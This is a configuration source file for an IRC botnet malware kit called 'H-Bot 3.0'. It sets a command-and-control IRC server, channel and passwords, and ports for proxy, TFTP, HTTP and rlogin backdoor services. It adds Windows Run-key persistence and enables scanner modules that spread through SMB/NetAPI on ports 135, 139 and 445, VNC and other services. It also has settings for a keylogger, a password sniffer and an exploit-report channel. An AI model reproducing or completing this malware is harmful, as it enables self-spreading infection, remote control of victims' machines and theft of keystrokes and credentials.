/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
htv mod... DO NOT LEAK THIS!

*/


// bot configuration (generic) - doesn't need to be encrypted
int port = 7002;				// Server port
int port2 = 6667;				// Backup server port
int socks4port = 3092;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 62;				// Port # for tftp daemon to run on
int httpport = 8989;			// Port # for http daemon to run on
int rloginport = 33332;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// Set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// Use random file name
BOOL AutoStart = TRUE;			// Enable autostart registry keys
char prefix = '.';				// Command prefix (one character max.)
int maxrand = 6;				// How many random numbers in the nick
int nicktype = REALNICK;		    // Nick type (see rndnick.h)
BOOL nickprefix = TRUE;			// Nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\system.dll";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.



char lsaip[] = "";                    // cftp host ".lsahost 192.168.1.1"
char lsaport[] = "4444";			// cftp port ".lsaport 6969"
char lsuser[] = "damn";
char lspass[] = "damn1";

// these have been tested and give best results, DON'T CHANGE!

SCANALL scanall[]={
{"napi2_139", true},
{"napi2_135", true},
{"napi2_445", true},
{"vnc", true},
{"WKSSVCE", true},
{"realcast", true},
{NULL, false}
};

//
BOOL sp2_mod = TRUE;			    	             // Sp2mod
char botid[] = "H-Bot Modded by SculenZ & TH Version 3.0";				            // Bot id
char version[] = "H-Bot 3.0";		             // Bots !version reply
char password[] = "0lly";					     // Bot password
char server[] = "irc.nopics-mum.info";                    // Server
char serverpass[] = "rly";					     // Server password
char channel[] = "#nopic";				     // Channel that the bot should join
char chanpass[] = "nopicbots";					     // Channel password
char server2[] = "";   // Backup server (optional)
char channel2[] = "";				     // Backup channel (optional)
char chanpass2[] = "";					     // Backup channel password (optional)
char filename[] = "";		// Destination file name *** your payload should match this too ***
char keylogfile[] = "";				     // Keylog filename
char valuename[] = ""; 				// Value name for autostart
char nickconst[] = "[STFUkthx]";		         			// First part to the bot's nick
char szLocalPayloadFile[]="";		        // **** make this the same as your bot filename! ****
char modeonconn[] = "+i";					 // Can be more than one mode and contain both + and -
char exploitchan[] = "";	   	  		// Channel where exploit messages get redirected
char keylogchan[] = "";					 // Channel where keylog messages get redirected
char psniffchan[] = "";		 			// Channel where psniff messages get redirected
		
char vncchan[] = ""; 

char techchan[] = ""; 



char *authost[] = {
	"*@*"
};

char *versionlist[] = { 
	"mIRC v6.17 Khaled Mardam-Bey\0",
	};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "2h3j5jklh7g359fsfdsfs";               // CHANGE THIS!!! hmmm..Do I even need this now?
#endif

